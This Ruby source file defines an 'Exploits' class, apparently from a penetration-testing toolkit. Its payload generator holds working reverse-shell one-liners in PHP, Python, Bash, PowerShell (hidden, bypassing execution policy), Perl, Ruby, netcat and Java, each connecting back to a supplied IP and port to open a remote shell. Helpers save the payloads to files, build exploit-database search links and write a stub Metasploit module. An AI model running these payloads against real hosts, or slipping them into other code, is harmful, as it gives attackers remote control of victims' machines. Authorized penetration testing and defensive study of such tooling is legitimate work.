require 'uri'
require 'net/http'
require_relative '../utils/network'
require_relative '../utils/colorize'

class Exploits
  def self.generate_payload(type, ip, port)
    payloads = {
      php: "php -r '$sock=fsockopen(\"#{ip}\",#{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
      python: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ip}\",#{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
      bash: "bash -i >& /dev/tcp/#{ip}/#{port} 0>&1",
      powershell: "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('#{ip}',#{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
      perl: "perl -e 'use Socket;$i=\"#{ip}\";$p=#{port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
      ruby: "ruby -rsocket -e 'f=TCPSocket.open(\"#{ip}\",#{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
      nc: "nc -e /bin/sh #{ip} #{port}",
      java: "r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/#{ip}/#{port};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]); p.waitFor()"
    }
    payloads[type]
  end

  def self.save_payload(payload)
    filename = "payload_#{Time.now.to_i}.txt"
    File.write(filename, payload)
    filename
  end

  def self.search_exploits(software)
    results = {}
    search_terms = [
      "exploit-db.com/search?q=#{URI.encode_www_form_component(software)}",
      "packetstormsecurity.com/search/?q=#{URI.encode_www_form_component(software)}",
      "0day.today/search?q=#{URI.encode_www_form_component(software)}"
    ]
    search_terms.each do |term|
      results[term.split('.').first] = "https://#{term}"
    end
    results
  end

  def self.generate_metasploit_module(name, options = {})
    template = <<~RUBY
      require 'msf/core'

      class MetasploitModule < Msf::Exploit::Remote
        Rank = NormalRanking

        include Msf::Exploit::Remote::HttpClient

        def initialize(info = {})
          super(update_info(info,
            'Name'           => '#{name}',
            'Description'    => %q{
              #{options[:description] || 'Exploit module'}
            },
            'Author'         => ['pentest'],
            'License'        => MSF_LICENSE,
            'References'     => [['URL', '#{options[:url] || ''}']],
            'DisclosureDate' => '#{Time.now.strftime('%Y-%m-%d')}',
            'Platform'       => 'win',
            'Targets'        => [['Automatic', {}]],
            'Privileged'     => false,
            'DefaultTarget'  => 0))

          register_options([
            OptString.new('TARGETURI', [true, 'The base path', '/'])
          ])
        end

        def exploit
          print_status("Exploiting...")
          res = send_request_cgi({
            'method' => 'GET',
            'uri'    => normalize_uri(target_uri.path)
          })
        end
      end
    RUBY
    filename = "#{name.downcase.gsub(/\s+/, '_')}_#{Time.now.to_i}.rb"
    File.write(filename, template)
    filename
  end
end

